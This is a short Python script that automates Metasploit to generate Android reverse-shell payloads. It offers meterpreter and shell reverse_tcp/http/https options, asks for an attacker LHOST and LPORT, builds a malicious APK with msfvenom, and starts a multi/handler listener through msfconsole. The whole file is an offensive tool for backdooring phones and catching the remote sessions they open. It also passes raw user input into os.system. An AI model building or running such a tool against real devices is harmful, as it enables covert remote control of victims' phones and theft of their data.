#!/usr/bin/env python

import sys
import pycolor
import os

pyc = pycolor.pyColor()

payloads = ['android/meterpreter/reverse_http', \
		'android/meterpreter/reverse_https', \
		'android/meterpreter/reverse_tcp', \
		'android/shell/reverse_http',\
		'android/shell/reverse_https', \
		'android/shell/reverse_tcp']

def setoptions():
	print(pyc.Imp("PAYLOADS"))
	for i in payloads:
		print "[%d]"%(payloads.index(i)+1), i
	payload = int(raw_input("Payload> "))
	payload = payloads[payload-1]
	LHOST = raw_input("LHOST> ")
	LPORT = raw_input("LPORT> ")
	return payload, LHOST, LPORT

def generate(payload, LHOST, LPORT):
	print pyc.Info("Generating payload...")
	construct = "msfvenom -p %s LHOST=%s LPORT=%s -o temp.apk"%(payload, LHOST, LPORT)
	z=os.system(construct)	
	if not (z):
		print pyc.Succ("Payload created as temp.apk")
	else:
		print pyc.Err("Couldn't create the payload")
		sys.exit()
	return

def msfhandler(payload,LHOST,LPORT):
	print pyc.Info("Setting msf handler for %s payload"%(payload.replace('/','_')))
	fhandle = open("msf.rc",'w')
	fhandle.write("use exploit/multi/handler\n")
	fhandle.write("set PAYLOAD %s\n"%payload)
	fhandle.write("set LHOST %s\n"%LHOST)
	fhandle.write("set LPORT %s\n"%LPORT)
	fhandle.write("set ExitOnSession false\n")
	fhandle.write("exploit -j\n")
	fhandle.close()
	os.system('msfconsole -qr msf.rc')
